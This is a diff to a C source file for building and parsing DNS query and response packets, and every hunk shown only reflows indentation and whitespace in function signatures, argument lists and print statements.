@@ -50,9 +50,9 @@ unsigned int debug = 0;
  * dns query buffer, "udp payload", which is passed to a socket.
  */
 unsigned char *createDnsQueryPacket(unsigned char _msgType,
-										unsigned char *_host,
-											unsigned char *_domain,
-												int *_sendLen)
+					unsigned char *_host,
+						unsigned char *_domain,
+							int *_sendLen)
 {
 	// to keep track of put()'s
 	int buffIndex = 0;
@@ -68,13 +68,13 @@ unsigned char *createDnsQueryPacket(unsigned char _msgType,
 
 	/* create and fill in a DNS_HEADER struct */
 	ptrStructDnsH = buildDnsHeader(
-						TRANSAC_ID,
-						QUERYFLAGS,
-						QDCOUNT,
-						ANCOUNT_NULL,
-						NSCOUNT_NULL,
-						ARCOUNT_NULL
-						);
+				TRANSAC_ID,
+				QUERYFLAGS,
+				QDCOUNT,
+				ANCOUNT_NULL,
+				NSCOUNT_NULL,
+				ARCOUNT_NULL
+				);
 
 	/* create and fill in a DNS_QUESTION struct */
 	ptrStructDnsQ = buildDnsQuestion(qName, QTYPE_A, QCLASS_IN);
@@ -84,9 +84,9 @@ unsigned char *createDnsQueryPacket(unsigned char _msgType,
 		free(hostName);
 
 	dnsQueryPacket = malloc(sizeof(struct DNS_HEADER) +
-							(strlen(ptrStructDnsQ->qname)+1) +
-								sizeof(ptrStructDnsQ->qtype) +
-									sizeof(ptrStructDnsQ->qclass));
+				(strlen(ptrStructDnsQ->qname)+1) +
+					sizeof(ptrStructDnsQ->qtype) +
+						sizeof(ptrStructDnsQ->qclass));
 
 	if(dnsQueryPacket == NULL)
 	{
@@ -99,7 +99,7 @@ unsigned char *createDnsQueryPacket(unsigned char _msgType,
 	}
 
 	/* dns header section field member copy */
-	putShort(dnsQueryPacket, &(ptrStructDnsH->id), 		&buffIndex);
+	putShort(dnsQueryPacket, &(ptrStructDnsH->id), 	    &buffIndex);
 	putShort(dnsQueryPacket, &(ptrStructDnsH->flags),   &buffIndex);
 	putShort(dnsQueryPacket, &(ptrStructDnsH->qdcode),  &buffIndex);
 	putShort(dnsQueryPacket, &(ptrStructDnsH->ancount), &buffIndex);
@@ -108,9 +108,9 @@ unsigned char *createDnsQueryPacket(unsigned char _msgType,
 
 	/* dns question section field member copy */
 	putString(dnsQueryPacket,
-					ptrStructDnsQ->qname,
-						strlen(ptrStructDnsQ->qname)+1, // +1 for null root
-							&buffIndex);
+			ptrStructDnsQ->qname,
+				strlen(ptrStructDnsQ->qname)+1, // +1 for null root
+					&buffIndex);
 
 	putShort(dnsQueryPacket, &(ptrStructDnsQ->qtype),  &buffIndex);
 	putShort(dnsQueryPacket, &(ptrStructDnsQ->qclass), &buffIndex);
@@ -136,7 +136,7 @@ unsigned char *createDnsQueryPacket(unsigned char _msgType,
  *
  */
 unsigned char *createDnsRfcQueryString(unsigned char *qNameArg,
-											unsigned int *rfcQNameLengthArg)
+					unsigned int *rfcQNameLengthArg)
 {
 	if(debug)
 	{
@@ -236,13 +236,13 @@ unsigned char *createDnsRfcQueryString(unsigned char *qNameArg,
  *
  */
 struct DNS_HEADER *buildDnsHeader (
-						unsigned short id,
-						unsigned short flags,
-						unsigned short qdcode,
-						unsigned short ancount,
-						unsigned short nscount,
-						unsigned short arcount
-						)
+			unsigned short id,
+			unsigned short flags,
+			unsigned short qdcode,
+			unsigned short ancount,
+			unsigned short nscount,
+			unsigned short arcount
+			)
 {
 	if(debug)
 	{
@@ -270,7 +270,7 @@ struct DNS_HEADER *buildDnsHeader (
 	}
 
 	// fill the fields of the DNS HEADER structure
-	ptrStructDnsH->id	 	= htons(id);
+	ptrStructDnsH->id	= htons(id);
 	ptrStructDnsH->flags 	= htons(flags);
 	ptrStructDnsH->qdcode 	= htons(qdcode);
 	ptrStructDnsH->ancount 	= htons(ancount);
@@ -302,8 +302,8 @@ struct DNS_HEADER *buildDnsHeader (
  * be passed to the appropriate routine.
  */
 struct DNS_QUESTION *buildDnsQuestion(unsigned char *qNameArg,
-											unsigned short qtypeArg,
-												unsigned short qclassArg)
+					unsigned short qtypeArg,
+						unsigned short qclassArg)
 {
 	if(debug)
 	{
@@ -393,7 +393,7 @@ struct DNS_QUESTION *buildDnsQuestion(unsigned char *qNameArg,
  *
  */
 struct NODE *constructStdoutList(unsigned char *_stdoutBuffer,
-									int _stdoutSize)
+					int _stdoutSize)
 {
 	if(debug)
 	{
@@ -449,7 +449,7 @@ struct NODE *constructStdoutList(unsigned char *_stdoutBuffer,
  *
  */
 struct DNS_RESPONSE_PACKET *parseDnsResponse(unsigned char *_recvBuff,
-												int _recvBuffSize)
+						int _recvBuffSize)
 {
 	if(debug)
 	{
@@ -521,7 +521,7 @@ void printDnsResponse(struct DNS_RESPONSE_PACKET *resp)
 	printf("RESPONSE NAME PTR: %hx    \n", ntohs(resp->dnsAnswer.name));
 	printf("RESPONSE TYPE: %hx        \n", ntohs(resp->dnsAnswer.type));
 	printf("RESPONSE QUERY CLASS: %hx \n", ntohs(resp->dnsAnswer.class));
-	printf("RESPONSE TTL -> %x	      \n", ntohl(resp->dnsAnswer.ttl));
+	printf("RESPONSE TTL -> %x	  \n", ntohl(resp->dnsAnswer.ttl));
 	printf("RESPONSE DATA LEN>: %hx   \n", ntohs(resp->dnsAnswer.rdlength));
 	printf("RESPONSE DATA: %x         \n", ntohl(resp->dnsAnswer.rdata));
 }
